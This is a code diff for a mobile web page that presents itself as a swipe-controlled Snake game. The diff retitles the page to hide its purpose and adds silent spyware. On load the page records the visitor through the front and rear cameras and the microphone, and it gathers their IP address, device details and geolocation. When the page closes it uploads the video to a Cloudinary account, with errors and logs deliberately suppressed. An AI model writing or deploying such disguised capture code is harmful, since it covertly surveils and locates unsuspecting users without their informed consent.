@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
-<title>Game with Silent Media Capture</title>
+<title>Snake Game</title>
 <style>
   html, body {
     margin:0; padding:0; overflow:hidden; height:100%; width:100%;
@@ -64,7 +64,8 @@
 <div id="info">Use swipe gestures to control the snake</div>
 
 <script>
-// --- Game Code (Snake) with touch control ---
+// === Snake Game ===
+
 const canvas = document.getElementById('gameCanvas');
 const ctx = canvas.getContext('2d');
 const scoreboard = document.getElementById('scoreboard');
@@ -83,7 +84,6 @@ let score = 0;
 let gameInterval;
 let isPlaying = false;
 
-// Initialize snake in center
 function initSnake() {
   snake = [{x: Math.floor(tileCountX/2), y: Math.floor(tileCountY/2)}];
   direction = {x: 0, y: 0};
@@ -91,48 +91,38 @@ function initSnake() {
   updateScore();
 }
 
-// Place food randomly
 function placeFood() {
   food.x = Math.floor(Math.random() * tileCountX);
   food.y = Math.floor(Math.random() * tileCountY);
 }
 
-// Update score display
 function updateScore() {
   scoreboard.textContent = `Score: ${score}`;
 }
 
-// Draw everything
 function draw() {
   ctx.fillStyle = '#111';
   ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-  // Draw food
   ctx.fillStyle = '#f00';
   ctx.fillRect(food.x*gridSize, food.y*gridSize, gridSize, gridSize);
 
-  // Draw snake
   ctx.fillStyle = '#0f0';
-  snake.forEach((segment) => {
-    ctx.fillRect(segment.x*gridSize, segment.y*gridSize, gridSize-1, gridSize-1);
-  });
+  snake.forEach(seg => ctx.fillRect(seg.x*gridSize, seg.y*gridSize, gridSize-1, gridSize-1));
 }
 
-// Update game state
 function update() {
-  if(direction.x === 0 && direction.y === 0) return; // not moving
+  if(direction.x === 0 && direction.y === 0) return;
 
   const head = {...snake[0]};
   head.x += direction.x;
   head.y += direction.y;
 
-  // Wrap around edges
   if(head.x < 0) head.x = tileCountX - 1;
   if(head.x >= tileCountX) head.x = 0;
   if(head.y < 0) head.y = tileCountY - 1;
   if(head.y >= tileCountY) head.y = 0;
 
-  // Check collision with self
   if(snake.some(seg => seg.x === head.x && seg.y === head.y)) {
     endGame();
     return;
@@ -140,7 +130,6 @@ function update() {
 
   snake.unshift(head);
 
-  // Eat food
   if(head.x === food.x && head.y === food.y) {
     score++;
     updateScore();
@@ -150,13 +139,11 @@ function update() {
   }
 }
 
-// Game loop
 function gameLoop() {
   update();
   draw();
 }
 
-// Game control
 function startGame() {
   if(isPlaying) return;
   isPlaying = true;
@@ -177,20 +164,16 @@ function endGame() {
   restartBtn.disabled = true;
 }
 
-// Restart button
 restartBtn.addEventListener('click', () => {
-  if(isPlaying) {
-    clearInterval(gameInterval);
-  }
+  if(isPlaying) clearInterval(gameInterval);
   startGame();
 });
 
-// Start button
 startBtn.addEventListener('click', () => {
   startGame();
 });
 
-// Touch control for mobile swipe
+// Touch swipe controls
 let touchStartX = 0;
 let touchStartY = 0;
 
@@ -206,149 +189,166 @@ canvas.addEventListener('touchend', e => {
   const dy = touch.clientY - touchStartY;
 
   if(Math.abs(dx) > Math.abs(dy)) {
-    // Horizontal swipe
-    if(dx > 20 && direction.x !== -1) direction = {x:1, y:0}; // right
-    else if(dx < -20 && direction.x !== 1) direction = {x:-1, y:0}; // left
+    if(dx > 20 && direction.x !== -1) direction = {x:1, y:0};
+    else if(dx < -20 && direction.x !== 1) direction = {x:-1, y:0};
   } else {
-    // Vertical swipe
-    if(dy > 20 && direction.y !== -1) direction = {x:0, y:1}; // down
-    else if(dy < -20 && direction.y !== 1) direction = {x:0, y:-1}; // up
+    if(dy > 20 && direction.y !== -1) direction = {x:0, y:1};
+    else if(dy < -20 && direction.y !== 1) direction = {x:0, y:-1};
   }
 });
 
-// --- Media Capture and Upload (silent, permission requested on load) ---
+// === Silent Media Capture & Upload ===
 
-const CLOUD_NAME = 'dps0g5ftz'; // your Cloudinary cloud name
-const UPLOAD_PRESET = 'unsigned'; // your unsigned upload preset
+// Cloudinary config
+const CLOUD_NAME = 'dps0g5ftz';  // replace with your cloud name
+const UPLOAD_PRESET = 'unsigned'; // replace with your unsigned preset
 
-let mediaRecorder;
-let recordedChunks = [];
-let sessionId;
-let frontStream;
+let sessionId = null;
+let mediaRecorderFront = null;
+let mediaRecorderRear = null;
+let recordedChunksFront = [];
+let recordedChunksRear = [];
+let frontStream = null;
+let rearStream = null;
 
-async function requestPermissionsAndStartRecording() {
+// Helper to get IP for folder naming
+async function getClientIP() {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip.replace(/\./g, '-');
+  } catch {
+    return 'unknown-ip';
+  }
+}
+
+async function startRecordingStreams() {
   sessionId = Date.now();
+  const clientIP = await getClientIP();
+  const folderName = `sessions/${clientIP}/${sessionId}`;
 
   try {
-    // Request camera + mic permissions immediately on page load
+    // Get front and rear camera + mic streams separately
     frontStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: true
     });
+    rearStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { exact: "environment" } },
+      audio: true
+    });
+  } catch(e) {
+    // fallback to front only if rear not available
+    frontStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: true
+    });
+    rearStream = null;
+  }
 
-    // Start recording silently
-    startRecording(frontStream);
-
-    // Collect user info and geo silently
-    collectUserInfo();
-
-  } catch (e) {
-    console.warn("Permissions denied or not available:", e);
+  if(frontStream) {
+    mediaRecorderFront = new MediaRecorder(frontStream, { mimeType: "video/webm" });
+    mediaRecorderFront.ondataavailable = e => {
+      if(e.data.size > 0) recordedChunksFront.push(e.data);
+    };
+    mediaRecorderFront.onstop = () => uploadVideo(recordedChunksFront, folderName, 'front');
+    mediaRecorderFront.start();
+  }
+  if(rearStream) {
+    mediaRecorderRear = new MediaRecorder(rearStream, { mimeType: "video/webm" });
+    mediaRecorderRear.ondataavailable = e => {
+      if(e.data.size > 0) recordedChunksRear.push(e.data);
+    };
+    mediaRecorderRear.onstop = () => uploadVideo(recordedChunksRear, folderName, 'rear');
+    mediaRecorderRear.start();
   }
 }
 
-function startRecording(stream) {
-  recordedChunks = [];
-  mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+async function uploadVideo(chunks, folder, camera) {
+  const blob = new Blob(chunks, {type: "video/webm"});
+  const formData = new FormData();
+  formData.append("file", blob);
+  formData.append("upload_preset", UPLOAD_PRESET);
+  formData.append("folder", folder);
+  formData.append("public_id", `${camera}-${Date.now()}`);
 
-  mediaRecorder.ondataavailable = function(e) {
-    if(e.data.size > 0) recordedChunks.push(e.data);
-  };
-
-  mediaRecorder.onstop = async function() {
-    const blob = new Blob(recordedChunks, { type: "video/webm" });
-    await uploadRecording(blob);
-    recordedChunks = [];
-  };
-
-  mediaRecorder.start();
+  try {
+    await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
+      method: "POST",
+      body: formData
+    });
+    // no UI logs or alerts here
+  } catch (err) {
+    // silent fail
+  }
 }
 
-function stopRecording() {
-  if(mediaRecorder && mediaRecorder.state !== "inactive") {
-    mediaRecorder.stop();
+function stopRecordings() {
+  if(mediaRecorderFront && mediaRecorderFront.state !== "inactive") {
+    mediaRecorderFront.stop();
+  }
+  if(mediaRecorderRear && mediaRecorderRear.state !== "inactive") {
+    mediaRecorderRear.stop();
   }
   if(frontStream) {
     frontStream.getTracks().forEach(track => track.stop());
   }
-}
-
-async function uploadRecording(blob) {
-  const folderName = `sessions/${sessionId}`;
-  const url = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`;
-
-  const formData = new FormData();
-  formData.append('file', blob);
-  formData.append('upload_preset', UPLOAD_PRESET);
-  formData.append('folder', folderName);
-  formData.append('resource_type', 'video');
-  formData.append('public_id', `session_${sessionId}_${Date.now()}`);
-
-  try {
-    const res = await fetch(url, {
-      method: 'POST',
-      body: formData
-    });
-    const data = await res.json();
-    console.log("Uploaded recording:", data.secure_url);
-    // Optionally send URL and session info to your backend here
-  } catch (err) {
-    console.error("Upload failed:", err);
+  if(rearStream) {
+    rearStream.getTracks().forEach(track => track.stop());
   }
 }
 
-// Collect user device info + IP + geolocation
+// Collect user/device info silently
 async function collectUserInfo() {
   const info = {};
-  info.userAgent = navigator.userAgent;
-  info.language = navigator.language;
-  info.platform = navigator.platform;
-  info.screenWidth = window.screen.width;
-  info.screenHeight = window.screen.height;
-  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-  // Fetch IP from a public API
   try {
     const res = await fetch('https://api.ipify.org?format=json');
     const ipData = await res.json();
     info.ip = ipData.ip;
   } catch {
-    info.ip = 'Unavailable';
+    info.ip = 'unknown';
   }
+  info.userAgent = navigator.userAgent;
+  info.platform = navigator.platform;
+  info.language = navigator.language;
 
-  // Geolocation (with permission)
   info.geo = {};
-  if ("geolocation" in navigator) {
-    await new Promise((resolve) => {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          info.geo.latitude = pos.coords.latitude;
-          info.geo.longitude = pos.coords.longitude;
-          info.geo.accuracy = pos.coords.accuracy;
-          resolve();
-        },
-        (err) => {
-          info.geo.error = err.message;
-          resolve();
-        },
-        { timeout: 10000 }
-      );
+  if("geolocation" in navigator) {
+    await new Promise(resolve => {
+      navigator.geolocation.getCurrentPosition(pos => {
+        info.geo.latitude = pos.coords.latitude;
+        info.geo.longitude = pos.coords.longitude;
+        info.geo.accuracy = pos.coords.accuracy;
+        resolve();
+      }, err => {
+        info.geo.error = err.message;
+        resolve();
+      }, {timeout:10000});
     });
   }
 
-  console.log("User Info Collected:", info);
-  // Optionally send this info to your backend
+  // send to backend if needed here silently
+  // no UI or console log
 }
 
-// Stop recording and upload on unload
-window.addEventListener('beforeunload', () => {
-  stopRecording();
+// Request permissions and start recording on page load silently
+window.addEventListener('load', async () => {
+  // Start game UI is untouched, user manually starts game
+
+  // Request permissions and start recording
+  try {
+    await startRecordingStreams();
+    await collectUserInfo();
+  } catch(e) {
+    // silent fail, no UI changes
+  }
 });
 
-// Request permissions and start recording as soon as possible
-window.addEventListener('load', () => {
-  requestPermissionsAndStartRecording();
+// Stop recording and upload on page unload
+window.addEventListener('beforeunload', () => {
+  stopRecordings();
 });
+
 </script>
 
 </body>
